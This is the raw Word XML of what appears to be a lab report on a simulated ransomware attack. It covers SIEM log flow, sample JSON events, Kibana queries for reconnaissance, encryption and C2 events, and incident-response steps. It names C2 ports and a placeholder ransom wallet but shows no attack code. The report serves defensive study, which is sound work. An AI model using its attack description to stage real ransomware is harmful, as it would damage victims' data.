        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>20251215_201412</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BFE57C" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Format: </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>YYYYMMDD_HHMMSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD388CF" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Purpose: Unique attack tracking across logs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103440F9" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Use Case: Correlating distributed attack events</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FAD46C8"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Bitcoin Wallet:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75813494" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Type: BTC (Bitcoin)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78CB0E5E" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Purpose: Ransom payment (simulation only)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F32F0D"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2C60C5CA" w14:textId="24683E8D"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BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">6. </w:t>
      </w:r>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">DETECTION &amp; ANALYSIS </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1790957A"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6.1 Detection Architecture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C31A8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Kali (Attack) ──&gt; Syslog-ng ──&gt; Logstash ──&gt; Elasticsearch ──&gt; Kibana</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DE53A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gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">Collect)   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Process)    (Store/Index)   (Visualize)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273C5C54"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Log Flow:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51AEC593" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Ransomware script generates structured logs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38DE880C" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Syslog-ng receives on UDP 514</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C160090" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Logstash ingests via TCP 6050</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="032063BE" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Elasticsearch indexes events</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9F11D2" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Kibana provides visualization &amp; search</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7B55B2"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6.2 Detection Methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F93652D"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Method 1: Log Aggregation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249D1989"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All attack events logged with structured data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E95A5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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483C6119"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"timestamp": "2025-12-15T20:14:12.744991",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F65E894"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"level": "WARNING",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1398503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roofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>attack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>": "20251215_201412",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5549BDF2"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"hostname": "kali",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0908CBB4"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"username": "kali",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317B6340"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"message": "RECON_START | System enumeration",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659B643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"source": "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>ransomware_advanced</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="155F92C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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8DBF9F"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Advantages:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EFCF181" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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lastRenderedPageBreak/>
        <w:t>Complete attack visibility</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C9CB49" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Structured data for analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70889F3C" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Correlation via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>attack_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4451BA68"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Method 2: Event Correlation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E68FA21"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Using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>attack_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> field to correlate all events:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C508F5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Kibana Query: attack_id:20251215_201412</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6998D8A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Result: 21 events retrieved</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BC2781"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Correlation Features:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78445979" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Phase identification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71298073" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Attack progression tracking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6031A19A" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Method 3: Visualization</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B118B73"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Created Dashboards:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1FBA4F" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Pie Chart</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Event type distribution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3B222C" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Timeline</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Chronological attack progression</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169AB1AD" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Data Table</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Detailed event listing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479EFC75" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Log View</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Raw log inspection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394800B3"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6.3 Kibana Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4FB7F5"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Search Queries Used:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F50FF2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Find all events for this attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615A64FF"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attack_id:20251215_201412</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E16A0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59AD246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Find all reconnaissance events</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625B1E92"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attack_id:20251215_201412 AND </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>message:RECON</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>_*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB0B0F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0182AD9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Find encryption events</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4AE90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attack_id:20251215_201412 AND </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>message:FILE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>_ENCRYPTED</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0DDA839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12F7193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Find C2 communication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8F8E57"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attack_id:20251215_201412 AND message:C2_*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A546DA5"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Event Distribution (Pie Chart):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FF2075" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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FILE_ENCRYPTED: 28.6% (6 events)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8CEB9A" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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RECON_CMD: 23.8% (5 events)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023752E5" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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C2 attempts: 14.3% (3 events)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F73D231" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Other events: 33.3% (7 events)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395361B8"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lastRenderedPageBreak/>
        <w:t>6.4 SIEM Capabilities Demonstrated</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED89800"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Log Collection:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> All events captured</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Normalization:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Structured JSON format</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Indexing:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Elasticsearch full-text search</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Correlation:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Attack ID grouping</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Visualization:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kibana dashboards</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Alerting:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Severity levels assigned</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Search:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Flexible query language</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="664C0EC4"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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E2BDBC8" wp14:editId="239B76B4">
            <wp:extent cx="5940425" cy="684530"/>
            <wp:effectExtent l="0" t="0" r="3175"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684530"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDF5C15"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3929AA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Figure 6.1: Elasticsearch query showing 21 events for attack ID 20251215_201412</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DC542B"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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E259DC0" wp14:editId="242197BB">
            <wp:extent cx="5940425" cy="4777740"/>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777740"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0495B47D" w14:textId="77777777" w:rsidR="00C324AC"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3929AA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Figure 6.2: Raw log entries with timestamps and messages</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E39E218"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Pr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37C6B7A0" wp14:editId="5D7F5508">
            <wp:extent cx="5940425" cy="412178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121785"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA3A5E3"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0CAF2B12" w14:textId="4C2EB82E" w:rsidR="00C324AC" w:rsidRPr="00A722B0" w:rsidRDefault="00C324AC" w:rsidP="00A722B0">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BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>7. RESPONSE RECOMMENDATIONS</w:t>
      </w:r>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">7.1 Immediate Actions (T+0 to T+1 hour) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371400D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1. Containment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1570435F"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Isolate affected host (192.168.100.10) from network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED54724"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Block outbound connections to C2 IPs/ports (31337, 8888, 8080)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2716E95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Disable user account "kali" pending investigation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3501E64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Take memory dump for forensic analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24ECE6F3"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2. Impact Assessment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F64BCF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Identify all encrypted files (6 confirmed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B2FF0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Check backup availability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BEF074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Verify encryption key location (/home/kali/test/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>decrypt_key.key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF66D0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Assess data exfiltration risk</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C0AD22"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3. Evidence Preservation:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BECF3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Export all logs from Security Onion (attack_id:20251215_201412)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3421217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Capture disk image of affected system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760E9970"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Document ransom note content</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29216682" w14:textId="77777777" w:rsidR="00C324AC"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lastRenderedPageBreak/>
        <w:t>- Screenshot all Kibana dashboards</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016656C8" w14:textId="77777777" w:rsidR="00C324AC"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4E1BEA0E" w14:textId="77777777" w:rsidR="00C324AC"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1FEF0C2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30B21D25" w14:textId="1172AED6"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A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">7.2 Short-term Actions (T+1 to T+24 hours) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C14DA46"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1. Malware Analysis:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0706945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Reverse engineer ransomware script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22765A9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Identify encryption algorithm (Fernet confirmed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317E7CDE" w14:textId="77A9FF7C"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Extract decryption </w:t>
